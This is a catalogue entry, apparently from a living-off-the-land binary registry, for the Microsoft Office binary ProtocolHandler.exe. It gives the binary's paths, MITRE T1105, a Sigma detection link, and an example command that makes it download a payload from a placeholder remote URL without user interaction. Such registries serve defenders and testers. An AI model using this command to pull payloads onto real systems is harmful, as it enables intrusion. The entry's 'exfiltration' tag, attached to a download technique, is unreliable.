---
id: windows-download-protocolhandler
namespace: windows:download:protocolhandler
name: protocolhandler
description: 'Microsoft Office binary Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe; C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe.'
author: Nir Chako
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- protocolhandler
parameters: []
features: []
execution:
  template: protocolhandler
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction))
  command: ProtocolHandler.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_lolbin_protocolhandler_download.yml
- type: ioc
  description: Suspicious Office application Internet/network traffic
install:
- method: choco
  package_name: protocolhandler
  commands:
  - choco install protocolhandler
---


# protocolhandler

protocolhandler is a Windows LOLBin. Microsoft Office binary Located at: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\ProtocolHandler.exe; C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\ProtocolHandler.exe; C:\Program Files (x86)\Microsoft Office\Office16\ProtocolHandler.exe.
